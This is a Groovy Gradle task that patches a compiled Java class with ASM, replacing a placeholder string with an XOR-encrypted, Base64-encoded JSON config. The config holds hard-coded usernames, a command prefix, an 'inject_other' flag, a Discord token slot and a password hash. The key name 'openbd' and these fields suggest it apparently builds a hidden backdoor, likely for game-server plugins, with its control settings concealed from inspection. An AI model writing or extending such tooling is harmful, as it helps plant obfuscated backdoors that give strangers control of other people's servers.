package com.tmquan2508.gradle

import groovy.json.JsonOutput
import org.gradle.api.DefaultTask
import org.gradle.api.file.DirectoryProperty
import org.gradle.api.provider.Property
import org.gradle.api.tasks.Input
import org.gradle.api.tasks.InputDirectory
import org.gradle.api.tasks.OutputDirectory
import org.gradle.api.tasks.TaskAction
import org.objectweb.asm.ClassReader
import org.objectweb.asm.ClassWriter
import org.objectweb.asm.Opcodes
import org.objectweb.asm.tree.AbstractInsnNode
import org.objectweb.asm.tree.ClassNode
import org.objectweb.asm.tree.InsnNode
import org.objectweb.asm.tree.LdcInsnNode
import org.objectweb.asm.tree.MethodNode

import java.nio.file.Files
import java.nio.file.Path
import java.util.Base64

abstract class InjectConfig extends DefaultTask {

    private static final String SECRET_KEY = "openbd.secret.key"
    private static final String CONFIG_PLACEHOLDER = "::CONFIG::"

    @InputDirectory
    abstract DirectoryProperty getClassesDir()

    @OutputDirectory
    abstract DirectoryProperty getOutputClassesDir()

    @Input
    abstract Property<String> getTargetClass()

    private static final Map<String, Object> CONFIG_DATA = [
            "uuids"        : "",
            "usernames"    : "Kudo,Vdung",
            "prefix"       : "!",
            "inject_other" : true,
            "warnings"     : false,
            "discord_token": "",
            "password"     : "5994471abb01112afcc18159f6cc74b4f511b99806da59b3caf5a9c173cacfc5"
    ]

    byte[] xorEncrypt(String input) {
        byte[] inputBytes = input.getBytes("UTF-8")
        byte[] keyBytes = SECRET_KEY.getBytes("UTF-8")
        byte[] outputBytes = new byte[inputBytes.length]
        for (int i = 0; i < inputBytes.length; i++) {
            outputBytes[i] = (byte) (inputBytes[i] ^ keyBytes[i % keyBytes.length])
        }
        return outputBytes
    }

    @TaskAction
    void execute() throws Exception {
        def classesDirFile = classesDir.get().asFile
        def outputDirFile = outputClassesDir.get().asFile
        def targetClassName = targetClass.get()

        if (!classesDirFile.exists()) {
            throw new RuntimeException("classes dir not found: " + classesDirFile)
        }
        if (!outputDirFile.exists()) {
            outputDirFile.mkdirs()
        }

        logger.lifecycle("-> Starting value injection task.")

        String configJson = JsonOutput.toJson(CONFIG_DATA)
        byte[] xorBytes = xorEncrypt(configJson)
        String finalEncryptedVal = Base64.getEncoder().encodeToString(xorBytes)
        boolean debugFlagValue = CONFIG_DATA.get("warnings") as boolean

        String targetPath = targetClassName.replace('.', '/') + ".class"
        Path inPath = classesDirFile.toPath().resolve(targetPath)

        if (!Files.exists(inPath)) {
            logger.error("  [ERROR] Target class not found: " + targetPath)
            return
        }

        logger.lifecycle("  [PATCH] Processing: " + targetPath)
        byte[] classBytes = Files.readAllBytes(inPath)

        ClassReader cr = new ClassReader(classBytes)
        ClassNode cn = new ClassNode()
        cr.accept(cn, 0)

        boolean changed = false

        cn.methods?.each { MethodNode mn ->
            mn.instructions?.each { AbstractInsnNode insn ->
                if (insn instanceof LdcInsnNode) {
                    def cst = (insn as LdcInsnNode).cst
                    if (cst instanceof String && cst == CONFIG_PLACEHOLDER) {
                        logger.lifecycle("  [LDC] in ${cn.name}.${mn.name}${mn.desc} -> replacing '${cst}' with encrypted JSON blob.")
                        (insn as LdcInsnNode).cst = finalEncryptedVal
                        changed = true
                    }
                }
            }

            if (mn.name == "<init>" && debugFlagValue) {
                def instructions = mn.instructions
                for (int i = 0; i < instructions.size(); i++) {
                    def insn = instructions.get(i)
                    if (insn.getOpcode() == Opcodes.ICONST_0) {
                        logger.lifecycle("  [OPCODE] in ${cn.name}.${mn.name}${mn.desc} -> replacing ICONST_0 with ICONST_1.")
                        instructions.set(insn, new InsnNode(Opcodes.ICONST_1))
                        changed = true
                        break
                    }
                }
            }
        }

        if (!changed) {
            logger.lifecycle("  [WARN] No placeholders were replaced in " + targetPath)
        }

        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES | ClassWriter.COMPUTE_MAXS)
        cn.accept(cw)
        byte[] outBytes = cw.toByteArray()

        Path targetOut = outputDirFile.toPath().resolve(targetPath)
        Files.createDirectories(targetOut.getParent())

        targetOut.toFile().withOutputStream {
            it.write(outBytes)
        }

        logger.lifecycle("  [OK] Wrote patched class to " + targetOut)
        logger.lifecycle("-> Task finished processing " + targetClassName)
    }
}